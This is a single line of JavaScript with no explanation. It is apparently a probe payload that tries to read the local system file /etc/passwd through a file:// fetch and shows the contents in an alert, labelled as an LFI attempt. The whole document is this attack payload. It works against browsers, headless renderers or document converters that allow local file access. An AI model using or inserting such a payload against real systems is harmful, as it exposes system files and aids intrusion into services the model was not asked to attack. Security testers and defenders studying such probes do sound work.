fetch('file:///etc/passwd').then(r => r.text()).then(t => alert(t)).catch(e => alert('LFI Failed'));
